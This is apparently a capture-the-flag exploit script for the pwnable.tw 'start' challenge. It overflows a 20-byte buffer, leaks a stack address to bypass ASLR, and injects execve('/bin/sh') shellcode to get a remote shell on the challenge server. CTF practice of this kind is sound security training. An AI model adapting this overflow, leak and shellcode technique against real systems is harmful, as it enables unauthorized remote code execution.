#! /usr/bin/python

from pwn import *
import sys, os
import struct

HOST = "chall.pwnable.tw"
PORT = 10000

sock = remote(HOST, PORT)

# Payload overwrites eip with address of
# the call to write(). This will write
# contents of the stack to the socket.
# In this case, that writes the address
# of esp (which was pushed onto the stack)
# back to us. This leaks the address, and
# lets us bypass ASLR
leak = 'A'*20  + p32(0x08048087) 
sock.send(leak)

# Receive 20 bytes of text
tmp = sock.recv(20)

# Leaked address
addr = u32(sock.recv(4))

# From http://shell-storm.org/shellcode/files/shellcode-811.php
# pwntools shellcraft.i386.linux.sh() wasnt cooperating
shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73" + \
            "\x68\x68\x2f\x62\x69\x6e\x89" + \
            "\xe3\x89\xc1\x89\xc2\xb0\x0b" + \
            "\xcd\x80\x31\xc0\x40\xcd\x80"


# Construct new payload
# 20 bytes filler, eip address, shellcode
payload = 'A'*20 + p32(addr+20) + shellcode

sock.send(payload)
sock.interactive()

sock.close()
